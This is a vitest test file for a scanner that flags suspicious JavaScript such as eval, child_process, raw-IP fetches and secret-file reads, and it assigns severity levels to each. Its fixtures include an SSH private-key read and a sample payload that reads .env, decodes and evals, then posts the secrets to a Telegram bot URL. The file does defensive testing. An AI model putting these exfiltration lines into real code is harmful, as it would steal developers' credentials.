import { describe, expect, test } from 'vitest';
import { sourceRules } from '../../../src/engine/rules/source';
import { SOURCE_REGEXES } from '../../../src/engine/rules/regexes';
import { ctx, vf } from '../load';

const run = (files: ReturnType<typeof vf>[]) => sourceRules.flatMap((r) => r(files, ctx));
const lvl = (path: string, text: string) => run([vf(path, text)]).map((f) => f.severity);
const EVAL = 'eval(x);';
const FN = 'new Function("return 1");';
const CP = 'require("child_process").exec(c);';
const IP = 'fetch("http://203.0.113.9/p");';
const SECRET = 'fs.readFileSync(home + "/.ssh/id_rsa");';
const B64 = 'const b = Buffer.from(s, "base64").toString();';

describe('single signals → caution', () => {
  test.each([['eval', EVAL], ['new-function', FN], ['child-process', CP], ['raw-ip-url', IP], ['secret-path-read', SECRET]])('%s', (name, code) => {
    const r = run([vf('src/a.js', code)]);
    expect(r.map((f) => f.severity)).toEqual(['caution']);
    expect(r[0]?.ruleId).toBe(`source.${name}`);
  });
  test('base64 decode alone is not a signal', () => expect(lvl('src/a.js', B64)).toEqual([]));
});

describe('combinations', () => {
  test('two distinct signals in one file → high', () => expect(lvl('src/a.js', `${EVAL}\n${IP}`)).toEqual(['high']));
  test('the same signal twice is still one signal → caution', () => expect(lvl('src/a.js', `${EVAL}\n${EVAL}`)).toEqual(['caution']));
  test('base64 decode next to eval → high; with a secret path read → critical', () => {
    expect(lvl('src/a.js', `${B64}\n${EVAL}`)).toEqual(['high']);
    expect(lvl('src/a.js', `${B64}\n${EVAL}\n${SECRET}`)).toEqual(['critical']);
  });
  test('base64 decode more than 300 chars from the sink is not base64-exec', () => {
    const r = run([vf('src/a.js', `${B64}\n${'// pad\n'.repeat(60)}${EVAL}`)]);
    expect(r.map((f) => f.ruleId)).toEqual(['source.eval']);
  });
  test('the demo fixture payload (read .env, decode, eval, post) is critical', () => {
    const code = "const env = fs.readFileSync('.env', 'utf8');\nconst b = Buffer.from('Y29u', 'base64').toString();\neval(b);\nfetch('https://api.telegram.org/bot1/sendMessage', { body: env });";
    expect(lvl('scripts/.cache/setup.js', code)).toEqual(['critical']);
  });
  test('all signals are listed in the evidence', () => {
    expect(run([vf('src/a.js', `${EVAL}\n${IP}`)])[0]?.evidence).toMatch(/eval.*raw-ip-url|raw-ip-url.*eval/);
  });
});

describe('false-positive guards', () => {
  test('child_process in scripts/, build/, tools/, config/ and *.config.* → no finding', () => {
    for (const p of ['scripts/build.js', 'build/x.js', 'tools/gen.ts', 'config/env.js', 'vite.config.ts', 'packages/a/scripts/b.js']) expect(lvl(p, CP), p).toEqual([]);
  });
  test('child_process elsewhere is flagged', () => expect(lvl('src/run.ts', CP)).toEqual(['caution']));
  test('eval is still flagged inside scripts/', () => expect(lvl('scripts/a.js', EVAL)).toEqual(['caution']));
  test('process.env is not a secret path read', () => expect(lvl('src/a.js', 'const k = process.env.API_KEY;')).toEqual([]));
  test('.env file references are', () => expect(lvl('src/a.js', "require('dotenv').config({ path: '.env' });")).toEqual(['caution']));
  test('localhost and loopback URLs are not raw-ip-url', () => {
    expect(lvl('src/a.js', 'fetch("http://127.0.0.1:3000/x"); fetch("http://0.0.0.0:80"); fetch("http://localhost:3000");')).toEqual([]);
  });
  test('method named evaluate / Function type annotation are not signals', () => {
    expect(lvl('src/a.ts', 'const f: Function = () => 1; model.evaluate(x); const retrieval = 1;')).toEqual([]);
  });
  test('non-source files are ignored', () => {
    expect(lvl('README.md', EVAL)).toEqual([]);
    expect(lvl('data.json', EVAL)).toEqual([]);
  });
  test('generated and vendored paths are ignored', () => {
    for (const p of ['dist/bundle.js', 'vendor/x.js', 'lib/x.min.js']) expect(lvl(p, EVAL), p).toEqual([]);
  });
});

describe('robustness', () => {
  test('reports the line of the first signal', () => expect(run([vf('src/a.js', `a;\nb;\n${EVAL}`)])[0]?.location).toEqual({ file: 'src/a.js', line: 3 }));
  test('a signal past 4096 chars on one line is not scanned (bounded work)', () => {
    expect(lvl('src/a.js', `${'x'.repeat(5000)} ${EVAL}`)).toEqual([]);
  });
  test('every exported regex runs in bounded time on pathological input', () => {
    const inputs = [' '.repeat(4096), 'a'.repeat(4096), '("\'' .repeat(1000), 'http://' + '1.'.repeat(2000), 'Buffer.from(' + 'x'.repeat(4000), 'new' + ' '.repeat(4000), '.env' + '.'.repeat(4000)];
    for (const [name, re] of Object.entries(SOURCE_REGEXES)) {
      for (const s of inputs) {
        const t = Date.now();
        re.test(s);
        expect(Date.now() - t, `${name} on ${s.slice(0, 12)}`).toBeLessThan(50);
      }
    }
  });
});
